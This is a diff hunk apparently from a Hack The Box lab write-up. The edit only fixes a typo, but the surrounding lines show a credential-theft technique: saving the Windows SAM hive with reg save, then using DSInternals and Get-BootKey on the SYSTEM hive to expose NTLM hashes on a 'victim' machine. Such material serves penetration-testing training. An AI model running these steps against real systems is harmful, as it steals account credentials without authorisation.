@@ -76,7 +76,7 @@ C:\htb> reg save HKLM\SAM SAM.SAV
 The operation completed successfully.
 ```
 
-Next, we transfer those file back to us, or if such is not possible, we use deploy DSInternals.psd1 over to our victim and expose NTLM Hash:
+Next, we transfer those file back to us, or if such is not possible, we deploy DSInternals.psd1 over to our victim and expose NTLM Hash:
 ```
 PS C:\htb> Import-Module .\DSInternals.psd1
 PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
